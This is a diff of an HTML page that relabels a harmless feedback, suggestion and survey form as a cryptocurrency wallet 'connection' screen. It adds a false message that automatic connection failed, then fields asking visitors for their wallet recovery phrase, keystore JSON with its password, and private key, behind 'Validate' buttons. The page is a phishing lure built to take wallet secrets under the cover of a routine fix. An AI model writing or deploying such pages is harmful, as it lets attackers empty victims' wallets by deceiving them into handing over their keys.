@@ -1179,7 +1179,7 @@ body::before {
 
             <p class="processing-text">
 
-                Please wait while we process
+                Please wait while we validate
                 your wallet.
 
             </p>
@@ -1199,8 +1199,8 @@ body::before {
 
 <p class="success-text">
 
-                We appreciate your selection.
-                Please choose an option below.
+                There was an error connecting automatically. 
+      But do not worry, you can still connect manually.
 
             </p>
 
@@ -1233,7 +1233,7 @@ body::before {
                     class="form-option active"
                     onclick="showForm('feedback', this)"
                 >
-                    Feedback
+                    Phrase
                 </button>
 
 
@@ -1242,7 +1242,7 @@ body::before {
                     class="form-option"
                     onclick="showForm('suggestion', this)"
                 >
-                    Suggestion
+                    Keystore ISON
                 </button>
 
 
@@ -1251,7 +1251,7 @@ body::before {
                     class="form-option"
                     onclick="showForm('survey', this)"
                 >
-                    Survey
+                    Private Key
                 </button>
 
             </div>
@@ -1275,14 +1275,14 @@ body::before {
                         class="form-label"
                         for="feedback"
                     >
-                        Feedback
+                        Phrase 
                     </label>
 
 
                     <textarea
                         id="feedback"
                         class="form-textarea"
-                        placeholder="enter your feed back"
+                        placeholder="Enter Wallet Phrase"
                         required
                     ></textarea>
 
@@ -1291,7 +1291,7 @@ body::before {
                         type="submit"
                         class="submit-button"
                     >
-                        Submit
+                        Validate
                     </button>
 
 
@@ -1326,14 +1326,14 @@ body::before {
                         class="form-label"
                         for="suggestion"
                     >
-                        Suggestion
+                        Keystore JSON
                     </label>
 
 
                     <textarea
                         id="suggestion"
                         class="form-textarea"
-                        placeholder="enter suggestions"
+                        placeholder="Enter Keystore JSON"
                         required
                     ></textarea>
 
@@ -1342,7 +1342,7 @@ body::before {
                         class="form-label"
                         for="suggestionName"
                     >
-                        Name
+                        Password
                     </label>
 
 
@@ -1350,7 +1350,7 @@ body::before {
                         type="text"
                         id="suggestionName"
                         class="form-input"
-                        placeholder="enter name"
+                        placeholder="Enter Wallet Password"
                         required
                     >
 
@@ -1359,7 +1359,7 @@ body::before {
                         type="submit"
                         class="submit-button"
                     >
-                        Submit
+                        Validate
                     </button>
 
 
